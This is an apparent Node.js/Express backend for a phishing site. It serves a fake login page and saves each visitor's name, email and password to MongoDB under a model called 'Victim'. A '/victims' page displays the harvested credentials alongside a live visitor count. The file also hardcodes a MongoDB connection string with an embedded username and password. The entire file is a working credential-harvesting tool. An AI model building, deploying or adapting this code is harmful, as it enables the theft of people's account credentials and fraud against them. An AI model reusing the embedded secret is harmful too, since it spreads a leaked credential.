const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();
const http = require('http');
const server = http.createServer(app);
const io = require('socket.io')(server);
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.urlencoded({ extended: true }));
app.set('view engine', 'ejs');

// Public path for assets
app.use('/assets', express.static(path.join(__dirname, 'public', 'assets')));

// MongoDB connection
mongoose.connect('mongodb+srv://shareenpan2:Fgouter55@cluster0.s3dpu.mongodb.net/sncad?retryWrites=true&w=majority&appName=Cluster0', { useNewUrlParser: true, useUnifiedTopology: true });

// Victim schema
const victimSchema = new mongoose.Schema({
    firstName: String,
    lastName: String,
    email: String,
    password: String,
    submittedAt: Date
});

const Victim = mongoose.model('Victim', victimSchema);

// Routes
app.get('/', (req, res) => {
    res.render('login');
});

let activeUsers = 0;

io.on('connection', (socket) => {
    console.log('A user connected');
    activeUsers++;
    io.emit('activeUsers', activeUsers); // Emit updated count to all clients
    socket.emit('activeUsers', activeUsers); // Send current active users count to the newly connected user

    socket.on('disconnect', () => {
        activeUsers--;
        io.emit('activeUsers', activeUsers); // Emit updated count to all clients
        console.log('A user disconnected');
    });
});

app.post('/login', (req, res) => {
    activeUsers++; // Increment active users count
    io.emit('activeUsers', activeUsers); // Emit updated count to all clients
    const newVictim = new Victim({
        firstName: req.body.firstName,
        lastName: req.body.lastName,
        email: req.body.email,
        password: req.body.password,
        submittedAt: new Date()
    });
    newVictim.save();
    res.send('Data saved successfully!');
});

app.get('/victims', async (req, res) => {
    try {
        const victims = await Victim.find();
        res.render('victims', { victims: victims, activeUsers: activeUsers }); // Pass active users count
    } catch (error) {
        res.status(500).send('Error retrieving victims data.');
    }
});

server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
}); 